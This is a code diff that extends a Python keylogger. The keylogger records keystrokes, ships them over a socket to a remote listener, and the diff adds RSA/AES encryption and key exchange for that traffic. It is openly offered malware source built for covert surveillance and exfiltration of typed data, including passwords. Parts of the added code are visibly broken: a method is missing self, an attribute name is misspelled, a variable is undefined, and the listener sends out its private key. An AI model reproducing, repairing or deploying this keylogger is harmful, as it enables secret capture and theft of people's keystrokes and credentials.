@@ -4,6 +4,12 @@ import keyboard
 import sys
 import socket
 import threading
+import zlib
+import base64
+from Cryptodome.Cipher import AES, PKCS1_OAEP
+from Cryptodome.PublicKey import RSA
+from Cryptodome.random import get_random_bytes
+from io import BytesIO
 from datetime import datetime
 
 # Classes for good python developer standards :)!
@@ -34,6 +40,18 @@ class Keylogger:
 
         self.log += name
 
+    # TODO bump out socket connection to initialize function
+    def init_conn(self):
+        # Check if there is already a socket connection, if there is, do nothing
+        try:
+            self.socket.connect((self.args.target, self.args.port))
+        except:
+            print("Error on socket creation")
+            sys.exit(1)
+
+        self.socket.send("REQ_PUB".encode())
+
+
     # Send log over the network
     def send_log(self):
         self.master_log += self.log
@@ -41,13 +59,6 @@ class Keylogger:
         if self.log:
             # Ending timestamp
             self.end_time = datetime.now()
-
-            # Check if there is already a socket connection, if there is, do nothing
-            try:
-                self.socket.connect((self.args.target, self.args.port))
-            except:
-                print("cant connect to socket")
-                pass
 
             # If there is keystrokes to send, send them :^)
             if self.log:
@@ -61,6 +72,51 @@ class Keylogger:
         timer = threading.Timer(interval=self.interval, function=self.send_log)
         timer.start()
 
+    # TODO
+    '''
+    Only listener generates keys client will send a heartbeat to the
+    listener and have the listener send the public key to encrypt with
+    '''
+    def generate_keys(self):
+        new_key = RSA.generate(2048)
+        self.private_key = new_key.exportKey()
+        self.public_key = new_key.publicKey().exportKey()
+
+    def get_rsa_cipher(key):
+        rsakey = RSA.importKey(key)
+        return (PKCS1_OAEP.new(rsakey), rsakey.size_in_byes())
+
+    def encrypt(self, plaintext):
+        compressed_text = zlib.compress(plaintext)
+
+        session_key = get_random_bytes(16)
+        cipher_aes = AES.new(session_key, AES.MODE_EAX)
+        ciphertext, tag = cipher_aes.encrypt_and_digest(compressed_text)
+
+        cipher_rsa, _ = self.get_rsa_cipher(self.public_key)
+        encrypted_session_key = cipher_rsa.encrypt(session_key)
+
+        msg_payload = encrypted_session_key + cipher_aes.nonce + tag + ciphertext
+        encrypted = base64.encodebytes(msg_payload)
+
+        return encrypted
+
+    def decrypt(self, encrypted):
+        encrypted_bytes = BytesIO(base64.decodebytes(encrypted))
+        cipher_rsa, keysize_in_bytes = get_rsa_cipher(self.private_key)
+
+        encrypted_session_key = encrypted_bytes.read(keysize_in_bytes)
+        nonce = encrypted_bytes.read(16)
+        ciphertext = encrypted_bytes.read()
+
+        session_key = cipher_rsa.decrypt(encrypted_session_key)
+        cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)
+        decrypted = cipher_aes.decrypt_and_verify(ciphertext, tag)
+
+        plaintext = zlib.decompress(decrypted)
+        return plaintext
+
+    # TODO Transfer keys on initial connnection
     # For the listener - handle a received a conncetion
     def handle(self, client_socket):
         print("[+] Receieved Connection")
@@ -72,18 +128,25 @@ class Keylogger:
                 buf += data
             else:
                 break
-            with open(self.args.outfile, "w") as f:
-                f.write(buf.decode())
-                print(f"[+] Wrote data to {self.args.outfile}")
+
+            if buf.decode() == "REQ_PUB":
+                client_socket.send(self.public_key.encode())
+            else:
+                with open(self.args.outfile, "w") as f:
+                    f.write(buf.decode())
+                    print(f"[+] Wrote data to {self.args.outfile}")
 
     # Create the listener to receive exfiltrated data
     def listen(self):
+        self.generate_keys()
         self.socket.bind((self.args.target, self.args.port))
         self.socket.listen(5)
+        print("[+] Listener started")
 
         # When there is a connection
         while True:
             client_socket, _ = self.socket.accept()
+            client_socket.send(self.private_key.encode())
             client_thread = threading.Thread(target=self.handle, args=(client_socket,))
             client_thread.start()
 
@@ -96,6 +159,7 @@ class Keylogger:
             try:
                 self.time = datetime.now()
                 keyboard.on_release(callback=self.callback)
+                self.init_conn()
                 self.send_log()
                 keyboard.wait()
 
